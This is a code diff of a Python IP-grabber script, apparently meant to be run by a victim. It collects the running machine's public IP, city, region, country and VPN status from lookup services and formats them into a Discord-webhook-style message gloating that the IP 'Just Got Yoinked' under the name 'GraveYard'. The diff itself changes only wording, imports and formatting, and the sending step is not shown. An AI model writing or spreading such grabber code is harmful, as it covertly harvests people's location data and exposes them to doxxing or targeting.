@@ -1,4 +1,4 @@
-import requests;from requests import get;import json
+from requests import get;import requests;import json;
 ip          =    get('https://api.ipify.org').text
 city        =    get(f'https://ipapi.co/{ip}/city').text 
 region      =    get(f'https://ipapi.co/{ip}/region').text
@@ -11,9 +11,11 @@ vpn         =    get('http://ip-api.com/json?fields=proxy').text
 
 def 一(str):
     data = {
-    "content" : f"""
-    **__{ip} Just Got Hornswoggled__**
-    **__Ip Info / 👻 __**                                                                               
+    (
+        "content"
+    ) : f"""
+    **__{ip} Just Got Yoinked__**
+       **__Ip Info / 👻 __**                                                                               
     > <:rip:959916670946791474> # **Country |  {country}**
     > <:rip:959916670946791474> # **City | {city}**
     > <:rip:959916670946791474> # **Region | {region}**
@@ -25,7 +27,7 @@ def 一(str):
     """,
     "username" : 
     (
-        "GraveYard / 👻"
+        "GraveYard // 👻"
     ),
     "avatar_url" : 
     (
